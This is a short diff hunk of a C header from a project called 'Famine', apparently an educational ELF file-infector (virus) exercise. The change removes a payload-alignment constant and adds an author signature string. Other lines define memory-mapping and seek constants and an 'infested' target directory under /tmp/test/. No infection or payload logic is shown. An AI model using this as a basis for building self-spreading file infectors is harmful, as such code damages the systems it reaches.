@@ -27,14 +27,14 @@
 # define PROT_WRITE 2
 # define MAP_FAILED ((void *)-1)
 
-# define PAYLOAD_ALIGN 0
-
 /* lseek */
 # define SEEK_SET 0
 # define SEEK_CUR 1
 # define SEEK_END 2
 
 # define INFESTED_DIR "/tmp/test/"
+
+# define SIGNATURE "Famine version 1.0 (c)oded by gmorer-rcarette"
 
 # define FORCE_INLINE __attribute__((always_inline)) inline
 
